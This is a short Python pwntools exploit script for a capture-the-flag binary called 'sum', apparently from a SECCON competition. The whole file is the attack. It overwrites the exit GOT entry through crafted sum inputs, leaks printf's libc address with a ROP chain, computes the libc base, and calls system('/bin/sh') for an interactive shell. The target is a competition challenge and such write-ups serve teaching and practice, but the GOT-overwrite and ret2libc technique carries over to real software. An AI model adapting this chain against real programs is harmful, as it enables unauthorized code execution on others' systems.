from pwn import *

elf = ELF("./sum_ccafa40ee6a5a675341787636292bf3c84d17264")
context.binary = elf
#context.log_level = "debug"

s = process("./sum_ccafa40ee6a5a675341787636292bf3c84d17264")
# s = remote("sum.chal.seccon.jp", 10001)

target = 0x00400a43  # pop; ret
v = [0]*6
v[0] = 0x00400a43  # pop rdi; ret
v[1] = 0x00601028  # printf@got
v[2] = 0x00400620  # printf@plt
v[3] = 0x00400904  # main+1
v[5] = 0x00601048  # exit@got
v[4] = target - sum(v)

print(" ".join(map(str, v)))
s.sendlineafter(b"2 3 4 0\n", " ".join(map(str, v)).encode("utf-8"))

printf = s.recvuntil(b"[")  # [sum system]
printf = unpack(printf[:-1].ljust(8, b"\0"))
print("printf: %x" % printf)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = printf - libc.symbols.printf

target = 0x00400a43  # pop; ret
v = [0]*6
v[0] = 0x00400a43  # pop rdi; ret
v[1] = next(libc.search("/bin/sh"))
v[2] = libc.symbols.system
v[3] = 0x00000001
v[5] = 0x00601048  # exit@got
v[4] = target - sum(v)

print(" ".join(map(str, v)))
s.sendlineafter("2 3 4 0\n", " ".join(map(str, v)))

s.interactive()
